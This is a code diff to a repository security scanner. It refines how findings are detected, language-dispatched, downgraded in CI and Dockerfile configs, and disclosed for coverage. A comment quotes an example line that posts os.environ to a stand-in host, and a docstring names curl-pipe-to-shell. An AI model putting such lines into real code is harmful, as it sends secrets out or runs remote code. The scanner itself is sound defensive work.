@@ -113,6 +113,11 @@ class ScanResult:
     findings: list[Finding] = field(default_factory=list)
     positive_signals: list[str] = field(default_factory=list)
     files_scanned: int = 0
+    # Coverage disclosure (#4): total scannable files BEFORE the _MAX_FILES_PER_REPO cap,
+    # and whether the signed grade is only a sample of the repo. Surfaced in the attestation
+    # so a partial-coverage grade is never presented as an authoritative whole-repo verdict.
+    total_scannable_files: int = 0
+    sampled: bool = False
     has_readme: bool = False
     has_license: bool = False
     has_tests: bool = False
@@ -183,22 +188,35 @@ def _redact_secret(line: str, match: re.Match) -> str:  # type: ignore[type-arg]
 
 
 def _detect_language(files: list[dict]) -> str:
-    """Detect primary language from file extensions."""
+    """Detect primary language from file extensions.
+
+    Only counts *real programming-language* extensions (the keys of ``lang_map``) —
+    config/data files (.json/.yaml/.toml/.ini/…) are NOT languages, so a TypeScript
+    repo full of package.json/tsconfig.json no longer reports its primary language as
+    ".json".
+    """
+    lang_map = {
+        ".py": "Python", ".ipynb": "Python",
+        ".js": "JavaScript", ".mjs": "JavaScript", ".cjs": "JavaScript",
+        ".jsx": "JavaScript",
+        ".ts": "TypeScript", ".tsx": "TypeScript",
+        ".go": "Go", ".rs": "Rust", ".rb": "Ruby",
+        ".java": "Java", ".kt": "Kotlin", ".cs": "C#",
+        ".php": "PHP", ".swift": "Swift", ".scala": "Scala",
+        ".lua": "Lua", ".pl": "Perl", ".pm": "Perl", ".r": "R",
+        ".groovy": "Groovy",
+        ".sh": "Shell", ".bash": "Shell", ".zsh": "Shell",
+    }
     ext_counts: dict[str, int] = {}
     for f in files:
         ext = Path(f.get("path", "")).suffix.lower()
-        if ext in SOURCE_EXTENSIONS:
+        if ext in lang_map:
             ext_counts[ext] = ext_counts.get(ext, 0) + 1
 
-    lang_map = {
-        ".py": "Python", ".js": "JavaScript", ".ts": "TypeScript",
-        ".go": "Go", ".rs": "Rust", ".rb": "Ruby",
-        ".java": "Java", ".kt": "Kotlin", ".cs": "C#",
-    }
     if not ext_counts:
         return "unknown"
     top_ext = max(ext_counts, key=ext_counts.get)  # type: ignore[arg-type]
-    return lang_map.get(top_ext, top_ext)
+    return lang_map[top_ext]
 
 
 async def _fetch_repo_tree(
@@ -558,6 +576,82 @@ def _is_test_or_doc_file(file_path: str) -> bool:
     return False
 
 
+def _is_infra_file(file_path: str) -> bool:
+    """Check if a file is CI/infra config (graded like tests/docs, not shipped code).
+
+    Dockerfiles, `.github/**` / `.gitlab/**` workflow YAMLs, and agent skill configs
+    (`.agents/**`) legitimately contain `RUN curl | sh`, pipe-to-shell, etc. Their
+    findings are DOWNGRADED (same as tests/docs) so a single CI recipe can't produce
+    the critical that zeroes an otherwise-clean repo's grade.
+    """
+    parts = Path(file_path).parts
+    if any(p in (".github", ".gitlab", ".agents", ".circleci", ".buildkite") for p in parts):
+        return True
+    name = Path(file_path).name
+    lname = name.lower()
+    if name == "Dockerfile" or name.startswith("Dockerfile.") or lname.endswith(".dockerfile"):
+        return True
+    # Common root-level CI config files
+    if lname in (".gitlab-ci.yml", ".travis.yml", "azure-pipelines.yml", "cloudbuild.yaml"):
+        return True
+    # Workflow YAMLs (e.g. under a workflows/ directory)
+    if any(p == "workflows" for p in parts) and lname.endswith((".yml", ".yaml")):
+        return True
+    return False
+
+
+# --- Per-file language dispatch (#2) -----------------------------------------
+# Language-SPECIFIC pattern groups must only run on files of that language, so Python
+# `exec()` no longer fires on `.mjs` and Ruby `system`/backtick no longer fires on TS
+# template literals. Language-AGNOSTIC groups (secrets, exfiltration, invisible unicode,
+# prompt injection) keep running on every file.
+_EXT_TO_LANG: dict[str, str] = {
+    ".py": "python", ".ipynb": "python",
+    ".js": "javascript", ".mjs": "javascript", ".cjs": "javascript", ".jsx": "javascript",
+    ".ts": "typescript", ".tsx": "typescript",
+    ".rb": "ruby",
+    ".go": "go",
+    ".rs": "rust",
+    ".java": "java",
+}
+
+# A pattern's NAME carries its language tag (e.g. "(Python)", "(Node.js)"); map those
+# tags to the file-languages they apply to. Node runs both JS and TS.
+_PATTERN_LANG_TAGS: list[tuple[str, frozenset]] = [
+    ("python", frozenset({"python"})),
+    ("node", frozenset({"javascript", "typescript"})),
+    ("(js)", frozenset({"javascript", "typescript"})),
+    ("ruby", frozenset({"ruby"})),
+    ("(go)", frozenset({"go"})),
+    ("rust", frozenset({"rust"})),
+    ("java", frozenset({"java"})),
+]
+
+
+def _required_langs(pattern_name: str) -> frozenset:
+    """Languages a pattern targets, inferred from its name. Empty = language-agnostic."""
+    lname = pattern_name.lower()
+    langs: set = set()
+    for tag, mapped in _PATTERN_LANG_TAGS:
+        if tag in lname:
+            langs |= mapped
+    return frozenset(langs)
+
+
+def _lang_ok(pattern_name: str, file_lang: str | None) -> bool:
+    """True if a (possibly language-specific) pattern should run on this file.
+
+    Patterns whose name has no language tag are agnostic → always run. A tagged
+    pattern runs only when the file's detected language is one it targets.
+    """
+    required = _required_langs(pattern_name)
+    if not required:
+        return True
+    if file_lang is None:
+        return False
+    return file_lang in required
+
+
 def _is_safe_exec_context(
     line: str, finding_name: str, file_path: str = "",
 ) -> bool:
@@ -695,6 +789,13 @@ def _scan_content(
         allowlist = set()
 
     is_test_or_doc = _is_test_or_doc_file(file_path)
+    # CI/infra files (#3) are graded like tests/docs so a Dockerfile / workflow recipe
+    # can't dominate the grade with a critical.
+    is_infra = _is_infra_file(file_path)
+    # Findings in tests/docs/infra are downgraded (never suppressed).
+    is_downgraded = is_test_or_doc or is_infra
+    # Per-file language for language-specific pattern dispatch (#2).
+    file_lang = _EXT_TO_LANG.get(Path(file_path).suffix.lower())
     # Manifest / skill files ARE the tool's instruction surface — never downgrade
     # prompt-injection / hidden-unicode there even if they look doc-ish.
     is_metadata = Path(file_path).name.lower() in AGENT_METADATA_FILES
@@ -705,9 +806,11 @@ def _scan_content(
         stripped = line.strip()
         if stripped.startswith(("#", "//", "*", "/*")):
             continue
-        # Skip lines that look like examples/docs
-        if "example" in stripped.lower() or "placeholder" in stripped.lower():
-            continue
+        # NOTE: (#6) we deliberately do NOT skip an entire line just because it contains
+        # the word "example"/"placeholder" — that let an attacker neutralize any rule with
+        # `# example` and silently ignored real code like
+        # `requests.post("https://example.com/collect", data=os.environ)`. Placeholder
+        # handling is now scoped to the matched secret VALUE only (see the secret loop).
 
         # --- Option 1: Inline suppression ---
         # If the line contains "ag-scan:ignore", skip pattern checks but
@@ -724,9 +827,13 @@ def _scan_content(
                 # Extra filter: skip if it's in a .env.example or test file
                 if ".example" in file_path or "test" in file_path.lower():
                     continue
-                # Skip if value is clearly a placeholder
-                val = match.group()
-                if val in ("YOUR_API_KEY", "your_api_key", "xxx", "changeme"):
+                # Skip if the MATCHED VALUE is clearly a placeholder (not the whole line).
+                # The captured secret value (group 1 when present, else the full match).
+                val = match.group(1) if match.groups() else match.group()
+                val_lower = val.lower()
+                if val in ("YOUR_API_KEY", "your_api_key", "xxx", "changeme") or any(
+                    tok in val_lower for tok in ("example", "placeholder", "your_api_key")
+                ):
                     continue
                 # --- Option 2: Allowlist check ---
                 if _is_allowlisted(file_path, name, allowlist):
@@ -744,15 +851,19 @@ def _scan_content(
         # Check unsafe exec
         for name, pattern, severity in UNSAFE_EXEC_PATTERNS:
             if pattern.search(line):
+                # Language dispatch (#2): skip a language-specific pattern on a
+                # non-matching file (e.g. Python exec() on a .mjs file).
+                if not _lang_ok(name, file_lang):
+                    continue
                 # --- Option 2: Allowlist check ---
                 if _is_allowlisted(file_path, name, allowlist):
                     continue
                 # --- Option 3: Context-aware check ---
                 if _is_safe_exec_context(line, name, file_path):
                     continue
-                # Downgrade severity in test/doc/example files
+                # Downgrade severity in test/doc/infra files
                 effective_severity = severity
-                if is_test_or_doc and severity in ("critical", "high"):
+                if is_downgraded and severity in ("critical", "high"):
                     effective_severity = "medium"
                 # Upgrade severity for shell=True (always dangerous)
                 effective_severity = _upgrade_shell_true_severity(
@@ -771,10 +882,12 @@ def _scan_content(
         # Check insecure deserialization (#7) — RCE class; NOT discounted for MCP
         for name, pattern, severity in INSECURE_DESERIALIZATION_PATTERNS:
             if pattern.search(line):
+                if not _lang_ok(name, file_lang):
+                    continue
                 if _is_allowlisted(file_path, name, allowlist):
                     continue
                 effective_severity = severity
-                if is_test_or_doc and severity in ("critical", "high"):
+                if is_downgraded and severity in ("critical", "high"):
                     effective_severity = "medium"
                 findings.append(Finding(
                     category="insecure_deserialization",
@@ -789,15 +902,18 @@ def _scan_content(
         # Check file system access
         for name, pattern, severity in FS_ACCESS_PATTERNS:
             if pattern.search(line):
+                # Language dispatch (#2)
+                if not _lang_ok(name, file_lang):
+                    continue
                 # --- Option 2: Allowlist check ---
                 if _is_allowlisted(file_path, name, allowlist):
                     continue
                 # --- Option 3: Context-aware check ---
                 if _is_safe_fs_context(line, name, file_path):
                     continue
-                # Downgrade severity in test/doc/example files
+                # Downgrade severity in test/doc/infra files
                 effective_severity = severity
-                if is_test_or_doc and severity in ("critical", "high"):
+                if is_downgraded and severity in ("critical", "high"):
                     effective_severity = "medium"
                 # Downgrade for safer pathlib patterns
                 effective_severity = _downgrade_fs_severity(
@@ -831,11 +947,14 @@ def _scan_content(
         # Check dynamic remote payload / rug-pull (external-URL-swap)
         for name, pattern, severity in DYNAMIC_REMOTE_LOAD_PATTERNS:
             if pattern.search(line):
+                # Language dispatch (#2) — untagged patterns (e.g. curl|sh) stay agnostic.
+                if not _lang_ok(name, file_lang):
+                    continue
                 if _is_allowlisted(file_path, name, allowlist):
                     continue
-                # Downgrade in test/doc/example files like other groups
+                # Downgrade in test/doc/infra files like other groups
                 effective_severity = severity
-                if is_test_or_doc and severity in ("critical", "high"):
+                if is_downgraded and severity in ("critical", "high"):
                     effective_severity = "medium"
                 findings.append(Finding(
                     category="dynamic_remote_load",
@@ -867,10 +986,10 @@ def _scan_content(
             if pattern.search(line):
                 if _is_allowlisted(file_path, name, allowlist):
                     continue
-                # Downgrade in test/doc/example files — EXCEPT manifest/skill metadata,
+                # Downgrade in test/doc/infra files — EXCEPT manifest/skill metadata,
                 # which is the actual attack surface (a poisoned description is not a doc).
                 effective_severity = severity
-                if is_test_or_doc and not is_metadata and severity in ("critical", "high"):
+                if is_downgraded and not is_metadata and severity in ("critical", "high"):
                     effective_severity = "medium"
                 findings.append(Finding(
                     category="prompt_injection",
@@ -900,7 +1019,7 @@ def _scan_content(
     # Split fetch->exec across lines: a network read + an exec sink co-occurring in
     # one file is the classic rug-pull loader the per-line scan can't see. Fire only
     # when they're within ~40 lines of each other (keeps the composite finding tight).
-    if not is_test_or_doc and NET_READ_RE.search(content) and EXEC_SINK_RE.search(content):
+    if not is_downgraded and NET_READ_RE.search(content) and EXEC_SINK_RE.search(content):
         net_lines = [i for i, ln in enumerate(lines) if NET_READ_RE.search(ln)]
         exec_lines = [i for i, ln in enumerate(lines) if EXEC_SINK_RE.search(ln)]
         if net_lines and exec_lines and any(
@@ -920,7 +1039,7 @@ def _scan_content(
         findings.extend(_scan_manifest_exec(content, file_path))
 
     # Toxic-flow / lethal-trifecta composition (#9) — whole-file capability co-occurrence
-    findings.extend(_composite_findings(content, file_path, lines, is_test_or_doc, allowlist))
+    findings.extend(_composite_findings(content, file_path, lines, is_downgraded, allowlist))
 
     # Add remediation hints to all findings
     for f in findings:
@@ -1418,12 +1537,17 @@ async def scan_repo(
             low = path.lower()
             return any(exc in low for exc in user_excludes)
 
-        scan_files = [
+        scannable_files = [
             item for item in tree
             if not _should_skip_path(item["path"])
             and _is_source_file(item["path"])
             and not _user_excluded(item["path"])
-        ][:_MAX_FILES_PER_REPO]
+        ]
+        # Coverage disclosure (#4): record the full scannable count BEFORE truncation,
+        # and flag when the signed grade is only a sample of the repo.
+        result.total_scannable_files = len(scannable_files)
+        result.sampled = result.total_scannable_files > _MAX_FILES_PER_REPO
+        scan_files = scannable_files[:_MAX_FILES_PER_REPO]
 
         # Load allowlist once for the whole scan
         allowlist = _load_allowlist()
@@ -1436,7 +1560,12 @@ async def scan_repo(
         sem = asyncio.Semaphore(scan_concurrency)
 
         async def _scan_one(item: dict) -> tuple:
-            """Fetch and scan a file. Returns (findings, positives, suppressed, digest)."""
+            """Fetch and scan a file.
+
+            Returns (findings, positives, suppressed, digest, scanned). ``scanned`` is
+            True only when the file was actually fetched AND scanned — a failed fetch or
+            empty file returns False so it does NOT inflate ``files_scanned`` (#7).
+            """
             path = item["path"]
             try:
                 async with sem:
@@ -1445,17 +1574,20 @@ async def scan_repo(
                         timeout=per_file_timeout,
                     )
                 if not content:
-                    return [], [], 0, None
+                    return [], [], 0, None, False
                 f, p, s = _scan_content(content, path, allowlist)
-                return f, p, s, (path, _canonical_tool_digest(content, path))
+                return f, p, s, (path, _canonical_tool_digest(content, path)), True
             except (asyncio.TimeoutError, Exception):
-                return [], [], 0, None
+                return [], [], 0, None, False
 
         tasks = [_scan_one(item) for item in scan_files]
         scan_results = await asyncio.gather(*tasks)
 
-        for findings_list, positives_list, suppressed, digest in scan_results:
-            result.files_scanned += 1
+        for findings_list, positives_list, suppressed, digest, scanned in scan_results:
+            # Only count files that were actually scanned (#7) — signed filesScanned
+            # must reflect real coverage, not attempted fetches.
+            if scanned:
+                result.files_scanned += 1
             result.findings.extend(findings_list)
             result.positive_signals.extend(positives_list)
             result.suppressed_count += suppressed
